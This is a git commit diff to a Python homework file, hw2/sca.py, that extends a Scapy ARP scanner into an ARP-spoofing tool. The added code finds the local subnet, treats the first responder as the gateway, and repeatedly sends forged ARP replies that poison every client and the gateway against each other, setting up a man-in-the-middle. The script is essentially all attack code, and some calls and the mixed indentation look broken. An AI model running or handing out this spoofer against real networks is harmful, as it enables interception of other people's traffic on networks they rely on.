254de3dc8e02eb2c276427a5bd6e8c68fb451941
MapleTangz <mapletang98@gmail.com>
2020-04-22 07:27:19 -0700

    sca.py

--- hw2/sca.py
+++ hw2/sca.py
@@ -1,6 +1,15 @@
+import scapy
 from scapy.all import ARP, Ether, srp
+import time
+import socket
+import fcntl
+import struct
 
-target_ip = "172.18.105.0/24"
+def get_ip_address(ifname):
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    return socket.inet_ntoa(fcntl.ioctl(s.fileno(),0x8915,struct.pack('256s',ifname[:15]))[20:24])
+
+target_ip = get_ip_address('ens33') + '/24'
 # IP Address for the destination
 # create ARP packet
 arp = ARP(pdst=target_ip)
@@ -15,12 +24,29 @@ result = srp(packet, timeout=3, verbose=0)[0]
 # a list of clients, we will fill this in the upcoming loop
 clients = []
 
+ap = ''
 for sent, received in result:
     # for each response, append ip and mac address to `clients` list
     clients.append({'ip': received.psrc, 'mac': received.hwsrc})
+    if ap == '':
+        ap = received.psrc
 
 # print clients
 print("Available devices in the network:")
 print("IP" + " "*18+"MAC")
+a ={}
 for client in clients:
     print("{:16}    {}".format(client['ip'], client['mac']))
+    a[client['ip']] = client['mac']   
+
+def spoof(target_ip, spoof_ip):
+    target_mac = a[target_ip]
+    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac,psrc=spoof_ip)
+    scapy.send(packet,verbose=0)
+
+while True:
+    for client in clients:
+    	if client['ip'] != ap:
+	    spoof(client['ip'], ap)
+	    spoof(ap, client['ip'])
+    time.sleep(2)
